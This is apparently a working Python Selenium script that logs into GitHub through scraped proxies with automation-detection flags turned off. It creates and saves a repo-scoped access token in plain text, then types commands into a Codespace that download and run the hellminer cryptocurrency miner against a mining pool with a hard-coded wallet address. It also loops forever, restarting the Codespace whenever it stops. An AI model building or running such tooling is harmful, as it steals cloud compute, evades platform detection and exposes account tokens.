import os
import time
import json
import logging
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.proxy import Proxy, ProxyType
from webdriver_manager.chrome import ChromeDriverManager


# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# File token storage
TOKEN_FILE = "token.txt"

# Scrape proxy
def scrape_proxy():
    url = "https://www.sslproxies.org/"
    response = requests.get(url)
    proxies = []
    if response.status_code == 200:
        lines = response.text.split("\n")
        for line in lines:
            if "<td>" in line:
                proxies.append(line.split("<td>")[1].split("</td>")[0])
    return proxies[:5]  # Return first 5 proxies


# Configure Selenium WebDriver with Proxy and Explicit Chromium Path
def configure_driver():
    chrome_options = Options()
    chrome_options.binary_location = "/usr/bin/chromium-browser"  # Lokasi Chromium di Codespace
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("--start-maximized")
    chrome_options.add_argument("disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--disable-dev-shm-usage")  # Untuk menghindari masalah resource di container
    chrome_options.add_argument("--no-sandbox")  # Diperlukan di lingkungan seperti Codespaces
    
    proxies = scrape_proxy()
    if proxies:
        proxy = proxies[0]  # Use the first proxy
        chrome_options.add_argument(f"--proxy-server={proxy}")
        logging.info(f"Using Proxy: {proxy}")
    return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)


# Login to GitHub
def github_login(driver, username, password):
    logging.info("Opening GitHub login page...")
    driver.get("https://github.com/login")
    
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "login_field"))).send_keys(username)
        driver.find_element(By.ID, "password").send_keys(password)
        driver.find_element(By.NAME, "commit").click()
        
        # Check for OTP prompt
        if "two-factor authentication" in driver.page_source.lower():
            otp = input("Enter OTP code: ")
            driver.find_element(By.ID, "otp").send_keys(otp, Keys.RETURN)
        
        logging.info("Successfully logged in!")
        return True
    except Exception as e:
        logging.error(f"Error during login: {e}")
        return False


# Generate and save token
def generate_token(driver):
    logging.info("Generating GitHub token...")
    driver.get("https://github.com/settings/tokens/new")
    
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "token_description"))).send_keys("Automated Token")
    driver.find_element(By.XPATH, "//input[@value='repo']").click()
    driver.find_element(By.XPATH, "//button[contains(text(), 'Generate token')]").click()
    
    token = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//code"))).text
    with open(TOKEN_FILE, "a") as f:
        f.write(f"{token}\n")
    logging.info(f"Token saved: {token}")


# Open Codespace link and execute commands
def open_and_execute_codespace(driver):
    logging.info("Opening Codespace link...")
    codespace_url = "https://github.com/codespaces/new?repository=my-repo&container=my-container&skip_quickstart=true&machine=standardLinux32gb&repo=746868415&ref=main&devcontainer_path=.devcontainer%2Fdevcontainer.json&geo=UsEast"
    driver.get(codespace_url)
    
    time.sleep(10)  # Wait for Codespace to load

    # Open terminal and execute commands
    actions = ActionChains(driver)
    actions.send_keys("sudo apt update && sudo apt install -y tmux libsodium23 libsodium-dev wget && \\\n")
    actions.send_keys("tmux new-session -d -s multi_terminal 'while true; do echo \"Menjaga koneksi tetap hidup...\"; sleep 5; clear; done' \\; \\\n")
    actions.send_keys("split-window -v 'wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz && tar -xvzf hellminer_linux64_avx2.tar.gz && ./hellminer -v -c stratum+tcp://cn.vipor.net:5040 -u RJMuH1ems9YZKZ1jDnqTtRLuQvuWmBpznQ.Device10 -p x' \\; \\\n")
    actions.send_keys("split-window -h 'while true; do echo \"Keep-alive ping\" > /dev/null; sleep 10; done' \\; \\\n")
    actions.send_keys("select-layout tiled \\; \\\n")
    actions.send_keys("attach\n")
    actions.perform()
    logging.info("Commands executed in Codespace!")


# Monitor and restart Codespace
def monitor_codespace(driver):
    while True:
        try:
            driver.refresh()
            if "stopped" in driver.page_source.lower():
                logging.warning("Codespace stopped! Restarting...")
                driver.find_element(By.XPATH, "//button[contains(text(), 'Restart')]").click()
                time.sleep(10)
            else:
                logging.info("Codespace is running...")
            time.sleep(30)
        except Exception as e:
            logging.error(f"Error monitoring Codespace: {e}")


# Main Function
def main():
    driver = configure_driver()
    while True:
        username = input("Masukkan username: ")
        password = input("Masukkan password: ")
        
        if github_login(driver, username, password):
            generate_token(driver)
            open_and_execute_codespace(driver)
            monitor_codespace(driver)
        else:
            logging.error("Login failed. Try again!")


if __name__ == "__main__":
    main()
